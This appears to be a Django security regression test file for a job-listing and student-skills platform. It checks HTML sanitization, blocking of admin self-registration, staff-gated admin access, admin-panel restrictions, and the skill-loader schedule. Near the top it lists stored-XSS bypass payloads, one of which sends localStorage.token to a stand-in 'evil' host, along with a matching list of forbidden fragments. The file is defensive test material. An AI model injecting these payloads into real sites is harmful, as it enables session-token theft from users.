"""Security regression tests for the two pre-deployment blockers.

Both were reachable by an unauthenticated attacker with an HTTP client, so
both get tests that exercise the actual attack rather than the fixed unit.
"""

from django.test import TestCase
from django.urls import reverse
from rest_framework.test import APIClient

from accounts.models import AdminProfile, Company, Student, User
from config.sanitization import sanitize_html, sanitize_text
from dashboard.models import Announcement
from job_listings.models import JobListing
from resources.models import TrainingProgramme

#: Payloads a stored-XSS filter has to survive. Each one is a real bypass of
#: some naive filter: regex strippers, blocklists, or escaping that runs on
#: output but not on attributes.
XSS_PAYLOADS = (
    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<scr<script>ipt>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror='fetch(\"//evil/?t=\"+localStorage.token)'>",
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<object data=\"javascript:alert(1)\"></object>",
    "<embed src=\"javascript:alert(1)\">",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<a href=\"JaVaScRiPt:alert(1)\">click</a>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
    "<form action=\"//evil\"><input name=a></form>",
    "<div style=\"background:url('javascript:alert(1)')\">x</div>",
    "<p onclick=alert(1)>text</p>",
    "<p onmouseover=alert(1)>text</p>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<base href=\"//evil/\">",
    "<link rel=stylesheet href=\"//evil\">",
    "<style>@import 'javascript:alert(1)';</style>",
    "<xss onafterscriptexecute=alert(1)>",
)

#: Anything that would let injected script run, or reach an attacker's origin.
FORBIDDEN_FRAGMENTS = (
    "<script", "javascript:", "onerror", "onload", "onclick", "onmouseover",
    "onafterscriptexecute", "<iframe", "<object", "<embed", "<svg", "<form",
    "<style", "<base", "<link", "<math", "<noscript", "style=",
)


def assert_inert(testcase, html):
    lowered = (html or "").lower()
    for fragment in FORBIDDEN_FRAGMENTS:
        testcase.assertNotIn(fragment, lowered,
                             f"{fragment!r} survived sanitization: {html!r}")


class HtmlSanitizerTests(TestCase):
    """The sanitizer itself, against every payload."""

    def test_every_payload_is_rendered_inert(self):
        for payload in XSS_PAYLOADS:
            with self.subTest(payload=payload):
                assert_inert(self, sanitize_html(payload))

    def test_legitimate_formatting_survives(self):
        """A sanitizer that eats real content gets turned off, so it has to
        keep what a job advert actually uses."""
        source = (
            "<h3>Responsibilities</h3>"
            "<ul><li>Build <strong>APIs</strong></li><li>Write <em>tests</em></li></ul>"
            "<p>Apply at <a href=\"https://example.test/jobs\">our site</a>.</p>"
            "<table><tr><th scope=\"col\">Skill</th><td colspan=\"2\">Python</td></tr></table>"
        )
        cleaned = sanitize_html(source)

        for keeper in ("<h3>", "<ul>", "<li>", "<strong>", "<em>", "<table>",
                       "Responsibilities", "Build", "Python",
                       'href="https://example.test/jobs"'):
            self.assertIn(keeper, cleaned)

    def test_outbound_links_get_noopener(self):
        cleaned = sanitize_html('<a href="https://example.test" target="_blank">x</a>')

        self.assertIn('rel="noopener noreferrer"', cleaned)

    def test_script_content_is_removed_not_unwrapped(self):
        """Unwrapping would leave the literal text "alert(1)" mid-paragraph."""
        cleaned = sanitize_html("<p>Before</p><script>alert(1)</script><p>After</p>")

        self.assertNotIn("alert(1)", cleaned)
        self.assertIn("Before", cleaned)
        self.assertIn("After", cleaned)

    def test_sanitizing_is_idempotent(self):
        """A re-save must not progressively mangle stored content."""
        for payload in XSS_PAYLOADS + ("<p>Plain <b>text</b></p>",):
            with self.subTest(payload=payload):
                once = sanitize_html(payload)
                self.assertEqual(sanitize_html(once), once)

    def test_plain_text_fields_lose_all_markup(self):
        self.assertEqual(
            sanitize_text("<b>Senior</b> <script>alert(1)</script>Engineer"),
            "Senior Engineer")

    def test_plain_text_keeps_ampersands_as_characters(self):
        """These fields are rendered as React text nodes, which escape on
        output. Storing them escaped showed the student the literal
        "R&amp;D Software Engineer" -- 42 scraped titles contain an
        ampersand."""
        for raw, expected in (
            ("R&D Software Engineer", "R&D Software Engineer"),
            ("Data Backup & Restore Architect", "Data Backup & Restore Architect"),
            ("QA/QC & Commissioning Engineer", "QA/QC & Commissioning Engineer"),
            # Already-escaped input is repaired rather than escaped again.
            ("R&amp;D Software Engineer", "R&D Software Engineer"),
        ):
            with self.subTest(raw=raw):
                self.assertEqual(sanitize_text(raw), expected)

    def test_markup_hidden_behind_an_entity_is_still_removed(self):
        """Unescaping must not be the last step, or it would reveal what the
        stripping pass just removed."""
        for raw in ("&lt;script&gt;alert(1)&lt;/script&gt;Analyst",
                    "&amp;lt;img src=x onerror=alert(1)&amp;gt;Engineer"):
            with self.subTest(raw=raw):
                out = sanitize_text(raw)
                self.assertNotIn("<", out)
                self.assertNotIn(">", out)

    def test_plain_text_sanitizing_is_idempotent(self):
        for raw in ("R&D Software Engineer", "<b>x</b> & <i>y</i>",
                    "&lt;script&gt;Analyst"):
            with self.subTest(raw=raw):
                once = sanitize_text(raw)
                self.assertEqual(sanitize_text(once), once)

    def test_empty_input_is_handled(self):
        for value in (None, "", 0):
            self.assertEqual(sanitize_html(value), "")
            self.assertEqual(sanitize_text(value), "")


class StoredHtmlIsSanitizedOnWriteTests(TestCase):
    """The database must never hold an executable payload.

    Sanitizing at the model rather than in one serializer is what makes this
    true for the scraper and for a shell session, not only for the HTTP
    endpoint someone remembered to guard.
    """

    def test_a_title_with_an_ampersand_is_stored_as_written(self):
        listing = JobListing.objects.create(
            job_title="Senior Software Engineer (C/C++) - Penang & KL",
            company_name="R&D Labs",
            source_type=JobListing.SourceType.SCRAPED,
            source_url="https://example.test/ampersand",
        )
        listing.refresh_from_db()

        self.assertEqual(listing.job_title,
                         "Senior Software Engineer (C/C++) - Penang & KL")
        self.assertEqual(listing.company_name, "R&D Labs")

    def test_job_description_is_sanitized(self):
        listing = JobListing.objects.create(
            job_title="Engineer<script>alert(1)</script>",
            description="<p>Real</p><img src=x onerror=alert(1)>",
            source_type=JobListing.SourceType.SCRAPED,
            source_url="https://example.test/xss",
        )
        listing.refresh_from_db()

        assert_inert(self, listing.description)
        self.assertIn("Real", listing.description)
        self.assertEqual(listing.job_title, "Engineer")

    def test_scraped_advert_is_sanitized_on_ingest(self):
        from scrape_jobs.services import save_scraped_job

        listing, _created = save_scraped_job({
            "job_title": "Data Analyst",
            "source_url": "https://example.test/scraped-xss",
            "description": "<p>Duties</p><svg onload=alert(1)>",
        })
        listing.refresh_from_db()

        assert_inert(self, listing.description)

    def test_training_programme_description_is_sanitized(self):
        user = User.objects.create_user(email="c@business.test", password="Strong1!",
                                        role=User.Role.COMPANY)
        company = Company.objects.create(user=user, company_name="Co")
        programme = TrainingProgramme.objects.create(
            company=company,
            title="Course<script>alert(1)</script>",
            description="<p>Syllabus</p><a href='javascript:alert(1)'>x</a>",
        )
        programme.refresh_from_db()

        assert_inert(self, programme.description)
        self.assertIn("Syllabus", programme.description)
        self.assertEqual(programme.title, "Course")

    def test_announcement_message_is_sanitized(self):
        user = User.objects.create_user(email="a@uni.test", password="Strong1!",
                                        role=User.Role.ADMIN, is_staff=True)
        profile = AdminProfile.objects.create(user=user, admin_name="Admin")
        announcement = Announcement.objects.create(
            admin=profile,
            title="Notice",
            message="<p>Body</p><iframe src='//evil'></iframe>",
        )
        announcement.refresh_from_db()

        assert_inert(self, announcement.message)
        self.assertIn("Body", announcement.message)

    def test_every_payload_survives_a_round_trip_inert(self):
        for index, payload in enumerate(XSS_PAYLOADS):
            with self.subTest(payload=payload):
                listing = JobListing.objects.create(
                    job_title=f"Role {index}",
                    description=payload,
                    source_type=JobListing.SourceType.SCRAPED,
                    source_url=f"https://example.test/payload-{index}",
                )
                listing.refresh_from_db()
                assert_inert(self, listing.description)


class AdminSelfRegistrationTests(TestCase):
    """Nobody may register themselves an administrator.

    The registration serializer accepted every User.Role choice, so an
    attacker could POST role="ADMIN", verify their own email, and receive an
    AdminProfile plus every permission gated on the role.
    """

    URL = "/api/auth/register/"

    def payload(self, **overrides):
        data = {
            "email": "attacker@evil.test",
            "password": "Str0ng!pass",
            "confirm_password": "Str0ng!pass",
            "name": "Attacker",
            "role": "ADMIN",
            "privacy_notice_accepted": True,
            "document_verification_consent": True,
        }
        data.update(overrides)
        return data

    def setUp(self):
        self.client = APIClient()

    def test_registering_as_admin_is_rejected(self):
        response = self.client.post(self.URL, self.payload(), format="json")

        self.assertEqual(response.status_code, 400)
        self.assertIn("role", response.data)
        self.assertFalse(User.objects.filter(email="attacker@evil.test").exists())
        self.assertFalse(AdminProfile.objects.exists())

    def test_no_admin_profile_can_be_created_by_registration(self):
        for role in ("ADMIN", "admin", "Admin"):
            with self.subTest(role=role):
                self.client.post(self.URL, self.payload(role=role), format="json")

        self.assertFalse(AdminProfile.objects.exists())
        self.assertFalse(User.objects.filter(role=User.Role.ADMIN).exists())

    def test_students_and_companies_still_register(self):
        for role, email in (("STUDENT", "s@uni.test"), ("COMPANY", "c@biz.test")):
            with self.subTest(role=role):
                response = self.client.post(
                    self.URL, self.payload(role=role, email=email), format="json")

                self.assertIn(response.status_code, (200, 201), response.data)
                self.assertTrue(User.objects.filter(email=email).exists())

    def test_an_existing_admin_account_cannot_be_re_registered(self):
        """The unverified-reuse path must not become account takeover."""
        admin = User.objects.create_user(
            email="admin@uni.test", password="Strong1!", role=User.Role.ADMIN,
            is_staff=True)
        admin.email_verified = False
        admin.is_active = False
        admin.save(update_fields=["email_verified", "is_active"])

        response = self.client.post(
            self.URL, self.payload(role="STUDENT", email="admin@uni.test"),
            format="json")

        self.assertEqual(response.status_code, 400)
        admin.refresh_from_db()
        self.assertEqual(admin.role, User.Role.ADMIN)
        self.assertTrue(admin.is_staff)
        self.assertFalse(Student.objects.filter(user=admin).exists())


class AdminPermissionRequiresStaffTests(TestCase):
    """The ADMIN role alone is not administrative access.

    Two independent facts are required, so a single writable field can never
    again be enough. This is what makes any ADMIN row that predates the fix
    harmless.
    """

    def setUp(self):
        self.client = APIClient()

    def make_admin(self, email, is_staff):
        user = User.objects.create_user(
            email=email, password="Strong1!", role=User.Role.ADMIN,
            is_staff=is_staff)
        AdminProfile.objects.create(user=user, admin_name="A")
        return user

    def test_role_without_staff_is_refused(self):
        self.client.force_authenticate(self.make_admin("fake@evil.test", False))

        for url in ("/api/dashboard/admin/", "/api/resources/certificates/"):
            with self.subTest(url=url):
                self.assertEqual(self.client.get(url).status_code, 403)

    def test_role_with_staff_is_allowed(self):
        self.client.force_authenticate(self.make_admin("real@uni.test", True))

        self.assertEqual(self.client.get("/api/dashboard/admin/").status_code, 200)

    def test_a_non_staff_admin_cannot_read_another_students_certificate(self):
        """The serializer and queryset choices are access control too."""
        student_user = User.objects.create_user(
            email="s@uni.test", password="Strong1!", role=User.Role.STUDENT)
        Student.objects.create(user=student_user, student_name="S")
        self.client.force_authenticate(self.make_admin("fake2@evil.test", False))

        response = self.client.get("/api/resources/certificates/")

        self.assertEqual(response.status_code, 403)


class CreateAdminCommandTests(TestCase):
    """The supported way to make an administrator sets both facts."""

    def test_the_command_grants_role_and_staff(self):
        from io import StringIO
        from django.core.management import call_command

        call_command("create_admin", "--email", "boss@uni.test",
                     "--name", "Boss", stdout=StringIO())

        user = User.objects.get(email="boss@uni.test")
        self.assertEqual(user.role, User.Role.ADMIN)
        self.assertTrue(user.is_staff)
        self.assertTrue(user.email_verified)
        self.assertEqual(user.admin_profile.admin_name, "Boss")

    def test_it_refuses_to_clobber_an_existing_account(self):
        from io import StringIO
        from django.core.management import call_command
        from django.core.management.base import CommandError

        User.objects.create_user(email="taken@uni.test", password="Strong1!",
                                 role=User.Role.STUDENT)

        with self.assertRaises(CommandError):
            call_command("create_admin", "--email", "taken@uni.test",
                         "--name", "X", stdout=StringIO())


class AdminCannotBypassTheEndorsementFlowTests(TestCase):
    """Django Admin must not be a second, quieter path to a decision.

    Approving a certificate is four things happening together: the evidence
    row is decided, StudentSkill is recalculated under the highest-evidence
    rule, the skill gaps are refreshed, and an audit row records who decided.
    A ModelAdmin form does the first and none of the rest, which would leave a
    certificate reading "approved" on the profile while granting nothing --
    and no record of who did it.
    """

    def setUp(self):
        from django.contrib.admin.sites import site
        from resources.models import Certificate
        from resources.admin import CertificateSkillEvidenceInline
        self.site = site
        self.Certificate = Certificate
        self.Inline = CertificateSkillEvidenceInline

    def test_a_certificate_cannot_be_edited_in_the_admin(self):
        model_admin = self.site._registry[self.Certificate]

        self.assertFalse(model_admin.has_change_permission(None))
        self.assertFalse(model_admin.has_add_permission(None))

    def test_the_decision_fields_are_read_only(self):
        model_admin = self.site._registry[self.Certificate]

        for field in ("verified_status", "verified_at", "admin",
                      "rejection_reason", "verification_notes"):
            with self.subTest(field=field):
                self.assertIn(field, model_admin.readonly_fields)

    def test_skill_evidence_cannot_be_edited_inline(self):
        inline = self.Inline(self.Certificate, self.site)

        self.assertFalse(inline.has_change_permission(None))
        self.assertFalse(inline.has_add_permission(None))
        self.assertFalse(inline.has_delete_permission(None))
        for field in ("approved_level", "review_status"):
            with self.subTest(field=field):
                self.assertIn(field, inline.readonly_fields)


class TranscriptReviewIsGoneFromTheAdminTests(TestCase):
    """Transcripts are processed automatically, so there is nothing to review.

    The Approve and Reject actions outlived the workflow they belonged to.
    Leaving them would have offered a decision on a document that no longer
    exists by the time the upload returns.
    """

    def test_the_admin_offers_no_review_actions(self):
        from django.contrib.admin.sites import site
        from resources.models import TranscriptUpload

        model_admin = site._registry[TranscriptUpload]

        self.assertNotIn("approve_selected", model_admin.actions or ())
        self.assertNotIn("reject_selected", model_admin.actions or ())
        self.assertFalse(hasattr(model_admin, "approve_selected"))
        self.assertFalse(hasattr(model_admin, "reject_selected"))

    def test_the_review_module_is_gone(self):
        """Dead code that still imports cleanly gets called again."""
        import importlib

        with self.assertRaises(ModuleNotFoundError):
            importlib.import_module("resources.transcript_verification")


class SkillTaxonomyLoaderTests(TestCase):
    """Skills first, aliases second, and neither silently skipped.

    The aliases used to be seeded by data migrations that skipped any alias
    whose canonical skill was missing. On a fresh database migrations run
    before the skills are imported, so every alias was skipped -- and nothing
    ran them again, so "JS", "Golang" and "S/4HANA" matched nothing on a new
    deployment.
    """

    def run_loader(self):
        from io import StringIO
        from django.core.management import call_command
        out = StringIO()
        call_command("import_skills", stdout=out)
        return out.getvalue()

    def test_it_loads_skills_and_their_aliases_together(self):
        from scrape_jobs.models import Skill, SkillAlias

        self.run_loader()

        self.assertGreater(Skill.objects.count(), 150)
        self.assertGreater(SkillAlias.objects.count(), 30)

    def test_every_shipped_alias_resolves(self):
        """The loader reports what it could not resolve; nothing should be."""
        output = self.run_loader()

        self.assertNotIn("not in cs_skills.csv", output)

    def test_the_aliases_point_at_the_right_skills(self):
        from scrape_jobs.models import SkillAlias

        self.run_loader()
        by_alias = dict(SkillAlias.objects.values_list(
            "alias_name", "skill__skill_name"))

        for alias, canonical in (
            ("JS", "JavaScript"), ("Golang", "Go"), ("k8s", "Kubernetes"),
            ("D365", "Microsoft Dynamics"), ("S/4HANA", "SAP S/4HANA"),
            ("MES", "Manufacturing Execution System"),
        ):
            with self.subTest(alias=alias):
                self.assertEqual(by_alias.get(alias), canonical)

    def test_running_it_twice_changes_nothing(self):
        from scrape_jobs.models import Skill, SkillAlias

        self.run_loader()
        skills, aliases = Skill.objects.count(), SkillAlias.objects.count()
        self.run_loader()

        self.assertEqual(Skill.objects.count(), skills)
        self.assertEqual(SkillAlias.objects.count(), aliases)

    def test_the_alias_migrations_no_longer_seed(self):
        """They are explicit no-ops now. A migration that silently seeds
        nothing is worse than one that says it does nothing."""
        import importlib

        for name in ("0004_seed_skill_aliases",
                     "0014_seed_enterprise_skill_aliases"):
            with self.subTest(migration=name):
                module = importlib.import_module(
                    "scrape_jobs.migrations." + name)
                self.assertEqual(len(module.Migration.operations), 1)


class MonthlyScheduleTests(TestCase):
    """Every command the scheduled refresh calls has to exist.

    The batch file drifted: it still called normalize_job_titles,
    normalize_job_listings, classify_ict_tracks and classify_ict_roles months
    after all four were deleted. Nothing failed loudly -- the task wrote four
    "Unknown command" lines into a log nobody reads and carried on.
    """

    def batch_commands(self):
        import re
        from pathlib import Path

        batch = (Path(__file__).resolve().parent.parent
                 / "schedule_scraper_monthly.bat")
        return re.findall(r"^python manage\.py (\w+)",
                          batch.read_text(encoding="utf-8"), flags=re.MULTILINE)

    def test_every_command_in_the_batch_file_exists(self):
        from django.core.management import get_commands

        called = set(self.batch_commands())

        self.assertTrue(called, "no commands found in the batch file")
        self.assertEqual(called - set(get_commands()), set(),
                         "the monthly refresh calls commands that do not exist")

    def test_the_taxonomies_are_loaded_before_the_scrape(self):
        """The scraper classifies each advert as it saves it, so a stale
        taxonomy would be baked into everything collected that night."""
        order = self.batch_commands()

        self.assertLess(order.index("import_skills"), order.index("scrape_jobs"))
        self.assertLess(order.index("load_market_roles"), order.index("scrape_jobs"))

    def test_skills_are_re_extracted_before_roles_are_classified(self):
        order = self.batch_commands()

        self.assertLess(order.index("reextract_job_skills"),
                        order.index("refresh_skill_gaps"))
        self.assertIn("classify_market_roles", order)

    def test_skill_gaps_are_refreshed_last(self):
        order = self.batch_commands()

        self.assertEqual(order[-1], "refresh_skill_gaps")
